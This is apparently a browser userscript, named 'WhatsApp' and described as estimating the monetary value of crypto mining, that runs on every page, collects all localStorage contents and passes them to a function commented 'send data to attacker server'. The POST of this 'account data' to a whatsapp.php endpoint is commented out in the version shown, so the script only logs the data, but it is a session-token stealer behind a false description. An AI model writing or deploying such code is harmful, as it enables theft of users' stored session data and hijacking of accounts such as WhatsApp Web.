// ==UserScript==
// @name         WhatsApp
// @namespace    http://tampermonkey.net/
// @version      0.18
// @description  tries to give a monetary value to your daily mining
// @author       Ruben Fernandes (Rauven)
// @match        *
// @icon         https://www.google.com/s2/favicons?domain=hpool.com
// @grant        none
// @require http://code.jquery.com/jquery-3.4.1.min.js
// ==/UserScript==

(function() {
    'use strict';
    let btn = document.createElement("button");
    btn.innerHTML = "CLICA NEU";
    document.body.appendChild(btn);

    console.log("V:", 1);

function GetStorage()
         {
			 var values = {};
			 var keys = Object.keys(localStorage);
			 var i = keys.length;
			 while ( i--)
			 {
				values[keys[i]] = localStorage.getItem(keys[i]);
			 }
			 return values;
         }

         //send data to attacker server
         function sendacct (data) {
         var xhttp = new XMLHttpRequest();

         //xhttp.open("POST", "https://localhost/whatsapp.php", true);
         //xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         //xhttp.send("account data=" + data);
		 console.log("data:", data);

         }//end of sendacct
         var result = GetStorage();
         var json = JSON.stringify(result);
         sendacct (json);

})();